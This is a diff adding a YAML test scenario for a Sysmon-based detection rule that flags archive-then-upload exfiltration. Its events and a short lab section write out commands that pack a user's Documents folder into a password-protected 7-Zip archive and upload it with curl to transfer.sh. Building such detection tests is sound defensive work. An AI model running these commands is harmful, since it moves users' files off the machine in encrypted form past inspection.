@@ -1,0 +1,23 @@
+scenario: SCE_Exfil_Archive_Then_Transfer
+cases:
+  - name: positive_7zip_password_then_curl_upload
+    expect_incidents: [exfil_archive_then_transfer]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\7-Zip\7z.exe', OriginalFileName: 7z.exe, Description: 7-Zip Console, CommandLine: '7z.exe a -pS3cr3t -mhe=on C:\Users\Public\docs.7z C:\Users\victim\Documents', ParentImage: 'C:\Windows\System32\cmd.exe'}
+      - at: 600
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\curl.exe', OriginalFileName: curl.exe, CommandLine: 'curl.exe --upload-file C:\Users\Public\docs.7z https://transfer.sh/docs.7z', ParentImage: 'C:\Windows\System32\cmd.exe'}
+  - name: negative_transfer_before_archive
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\curl.exe', OriginalFileName: curl.exe, CommandLine: 'curl.exe --upload-file C:\Users\Public\old.7z https://transfer.sh/old.7z', ParentImage: 'C:\Windows\System32\cmd.exe'}
+      - at: 300
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\7-Zip\7z.exe', OriginalFileName: 7z.exe, CommandLine: '7z.exe a -pS3cr3t C:\Users\Public\docs.7z C:\Users\victim\Documents', ParentImage: 'C:\Windows\System32\cmd.exe'}
+  - name: negative_archive_without_password
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\7-Zip\7z.exe', OriginalFileName: 7z.exe, CommandLine: '7z.exe a C:\backup\docs.7z C:\Users\victim\Documents', ParentImage: 'C:\Windows\System32\cmd.exe'}
+      - at: 300
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\curl.exe', OriginalFileName: curl.exe, CommandLine: 'curl.exe --upload-file C:\backup\docs.7z https://transfer.sh/docs.7z', ParentImage: 'C:\Windows\System32\cmd.exe'}
+lab:
+  - 'Нужен 7-Zip: & "C:\Program Files\7-Zip\7z.exe" a -pLab123 C:\Users\Public\lab.7z C:\Windows\win.ini'
+  - 'curl.exe --upload-file C:\Users\Public\lab.7z https://transfer.sh/lab.7z --max-time 5'
